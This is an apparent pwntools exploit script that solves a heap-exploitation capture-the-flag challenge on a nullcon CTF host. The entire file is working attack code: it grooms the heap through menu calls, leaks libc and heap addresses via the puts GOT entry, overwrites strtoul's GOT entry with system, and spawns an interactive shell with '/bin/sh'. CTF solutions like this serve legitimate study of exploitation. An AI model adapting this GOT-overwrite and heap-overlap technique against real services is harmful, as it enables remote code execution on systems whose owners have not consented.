#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('challenge3')

host = args.HOST or 'pwn.ctf.nullcon.net'
port = int(args.PORT or 4002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ["gnome-terminal", "-e"]
io = start()

def _snd(p, msg):
    io.sendafter(str(p), str(msg))

def _sndl(p, msg):
    io.sendlineafter(str(p), str(msg))

def add(size, name, price):
    _snd('>', 1)
    _sndl(':', str(size))
    _snd(':', str(name))
    _sndl(':', str(price))

def remove(idx):
    _snd('>', 2)
    _sndl(':', str(idx))

def view():
    _snd('>', 3)

if args.LOCAL:
    libc = ELF('/lib64/libc.so.6')
else:
    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

add(0x80, "test1", 1)
add(0x80, "test2", 2)
add(0x80, "test3", 3)
add(0x80, "test4", 4)
add(16, p64(0x0) + p64(0x70), 5)
add(0x80, "test6", 6)

remove(0)
remove(1)
remove(2)

add(0x38, p64(999) + p64(exe.got['puts']), 999)

# leaking
_snd('>', 3)
io.recvuntil('"index": 999')
io.recvline()
io.recvuntil('"name": "')
data = io.recvline().replace('",', "").strip() + "\x00" * 2
data = u64(data) - libc.symbols['puts']
log.success("libc: {}".format(hex(data)))
libc.address = data

remove(3)
view()
io.recvuntil('"index": 6')
io.recvuntil('"index": ')
heap = int(io.recvline().strip().replace(',', ''))
log.success("heap: {}".format(hex(heap)))

add(0x80, "test7", 7)
add(0x80, "test8", 8)
add(0x80, "test9", 9)
add(0x80, "test10", 10)
add(0x80, "test11", 11)
off_to_chunk5_name = 896

remove(3)
remove(0)
log.info("{}".format(hex(heap + off_to_chunk5_name + 8 * 2)))
add(0x38, p64(888) + p64(heap + off_to_chunk5_name + 8 * 2), 888)
remove(5)
remove(3)
add(0x60, p64(0xdeadbeef) * 2 + p64(exe.got['strtoul']) + p64(0xdeadbeef), 99999)
add(0x30, p64(libc.symbols['system']), "/bin/sh\x00")
io.interactive()

